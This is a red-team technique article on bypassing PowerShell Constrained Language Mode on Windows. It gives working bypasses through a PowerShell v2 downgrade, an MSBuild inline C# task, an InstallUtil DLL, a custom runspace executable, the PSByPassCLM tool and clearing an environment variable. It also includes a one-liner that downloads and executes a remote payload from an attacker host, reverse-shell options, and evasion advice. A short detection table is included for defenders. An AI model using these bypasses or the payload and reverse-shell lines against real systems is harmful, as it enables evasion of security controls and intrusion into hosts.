# Constrained Language Mode (CLM) Bypass

> **MITRE ATT&CK**: Defense Evasion > T1059.001 - Command and Scripting Interpreter: PowerShell
> **Platforms**: Windows
> **Required Privileges**: User
> **OPSEC Risk**: Medium

## Strategic Overview

Constrained Language Mode (CLM) restricts PowerShell language elements: blocking .NET type access, COM objects, type accelerators, and inline C# compilation. CLM is typically enforced through AppLocker or WDAC policies -- when application whitelisting is active, PowerShell automatically restricts unauthorized scripts. For a Red Team Lead, CLM blocks the majority of offensive PowerShell tooling (PowerView, Rubeus wrappers, Empire modules). Understanding the enforcement mechanism is key: AppLocker-enforced CLM requires different bypasses than environment-variable-based CLM.

## Technical Deep-Dive

### What CLM Restricts

```powershell
# BLOCKED in Constrained Language Mode:
[System.Net.WebClient]                    # .NET type access
New-Object -ComObject WScript.Shell       # COM objects
Add-Type -TypeDefinition $code            # Inline C# compilation
[Reflection.Assembly]::LoadFile(...)      # Assembly loading

# ALLOWED in CLM:
Get-Process                               # Approved cmdlets
$a = 1 + 2                               # Basic arithmetic
Get-Content file.txt                      # Basic file reading
```

### Detecting Language Mode and Enforcement

```powershell
$ExecutionContext.SessionState.LanguageMode   # FullLanguage or ConstrainedLanguage
Get-AppLockerPolicy -Effective | Format-List  # AppLocker policy details
[Environment]::GetEnvironmentVariable('__PSLockdownPolicy')  # Value 4 = CLM
```

### CLM Enforcement Mechanisms

AppLocker script rules active means unauthorized scripts get ConstrainedLanguage. WDAC is kernel-enforced (harder to bypass). The `__PSLockdownPolicy` environment variable (value=4) is the easiest enforcement to bypass.

### PowerShell v2 Downgrade

PowerShell v2 predates CLM, AMSI, and Script Block Logging:

```powershell
powershell.exe -version 2 -Command {
    $ExecutionContext.SessionState.LanguageMode  # FullLanguage
    [System.Net.WebClient]::new().DownloadString("http://attacker/payload.ps1") | IEX
}
Get-WindowsOptionalFeature -Online -FeatureName NetFx3 | Select State  # Check availability
```

### MSBuild Bypass to Full Language PowerShell

MSBuild executes C# inline tasks outside PowerShell CLM:

```xml
<!-- clm_bypass.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="CLMBypass"><BypassTask/></Target>
  <UsingTask TaskName="BypassTask" TaskFactory="CodeTaskFactory"
    AssemblyFile="Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.Management.Automation"/>
      <Code Type="Class" Language="cs">
<![CDATA[
using System; using System.Management.Automation; using System.Management.Automation.Runspaces;
using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
public class BypassTask : Task {
    public override bool Execute() {
        Runspace rs = RunspaceFactory.CreateRunspace(); rs.Open();
        PowerShell ps = PowerShell.Create(); ps.Runspace = rs;
        ps.AddScript("$ExecutionContext.SessionState.LanguageMode"); // FullLanguage
        foreach (var r in ps.Invoke()) Console.WriteLine(r);
        return true;
    }
}
]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe clm_bypass.csproj
```

### InstallUtil Bypass

```csharp
// Compile: csc /target:library /out:bypass.dll bypass.cs
using System; using System.Management.Automation; using System.Management.Automation.Runspaces;
[System.ComponentModel.RunInstaller(true)]
public class CLMBypass : System.Configuration.Install.Installer {
    public override void Uninstall(System.Collections.IDictionary savedState) {
        Runspace rs = RunspaceFactory.CreateRunspace(); rs.Open();
        PowerShell ps = PowerShell.Create(); ps.Runspace = rs;
        ps.AddScript("$ExecutionContext.SessionState.LanguageMode");
        foreach (var r in ps.Invoke()) Console.WriteLine(r);
    }
}
```

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U bypass.dll
```

### Custom C# Runspace

```csharp
// Standalone executable hosting unrestricted PowerShell runspace
using System; using System.Management.Automation; using System.Management.Automation.Runspaces;
class Program {
    static void Main(string[] args) {
        Runspace rs = RunspaceFactory.CreateRunspace(InitialSessionState.CreateDefault());
        rs.Open();
        using (PowerShell ps = PowerShell.Create()) {
            ps.Runspace = rs;
            ps.AddScript(args.Length > 0 ? System.IO.File.ReadAllText(args[0])
                : "$ExecutionContext.SessionState.LanguageMode");
            foreach (var r in ps.Invoke()) Console.WriteLine(r);
        }
    }
}
```

### PSByPassCLM Tool

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U PsBypassCLM.exe
:: With reverse shell: add /revshell=true /rhost=10.0.0.1 /rport=443
```

### CIM/WMI Operations (Work Under CLM)

```powershell
Get-CimInstance -ClassName Win32_Process
Get-CimInstance -ClassName Win32_Service
Invoke-CimMethod -ClassName Win32_Process -MethodName Create `
    -Arguments @{CommandLine="cmd.exe /c whoami > C:\temp\out.txt"}
```

### __PSLockdownPolicy Variable Bypass

Only works when CLM is enforced via environment variable (not AppLocker/WDAC):

```powershell
# Clear the variable (requires appropriate permissions)
[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', $null, 'Machine')
# Or start PowerShell without inheriting it
cmd /c "set __PSLockdownPolicy= && powershell"
```

## Detection & Evasion

| Indicator | Source | Notes |
|-----------|--------|-------|
| PowerShell v2 engine start | Event ID 400/403 | EngineVersion=2.0 is suspicious |
| MSBuild loading System.Management.Automation | Process + file monitoring | Anomalous DLL load |
| InstallUtil with /U on non-installer DLLs | Process creation logs | Unusual execution pattern |
| New PowerShell runspace creation | .NET ETW provider | Assembly loading events |
| __PSLockdownPolicy modification | Sysmon Event ID 13 | Environment variable change |
| MSHTA spawning PowerShell | Process creation | Unexpected parent-child chain |

**Evasion Guidance**: Determine enforcement mechanism first (variable vs AppLocker vs WDAC). Prefer compiled C# over PowerShell to bypass the scripting engine entirely. Use MSBuild for quick wins -- most reliable LOLBIN for CLM bypass. Avoid PSv2 in monitored environments (obvious log entries). Consider abandoning PowerShell altogether in favor of C# execute-assembly, BOF, or compiled tools.

## Cross-References

- [AMSI Bypass](amsi-bypass.md) -- CLM and AMSI are complementary; both must be bypassed
- [AppLocker Bypass](applocker-bypass.md) -- AppLocker enforces CLM; bypassing AppLocker may bypass CLM
- [ETW Evasion](etw-evasion.md) -- .NET ETW reveals runspace creation and assembly loading
- [AV/EDR Evasion](av-edr-evasion.md) -- EDR monitors CLM bypass patterns

## References

- PowerShell Language Modes: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes
- PSByPassCLM: https://github.com/padovah4ck/PSByPassCLM
- LOLBAS Project: https://lolbas-project.github.io/
- WDAC documentation: https://docs.microsoft.com/en-us/windows/security/threat-protection/device-guard/
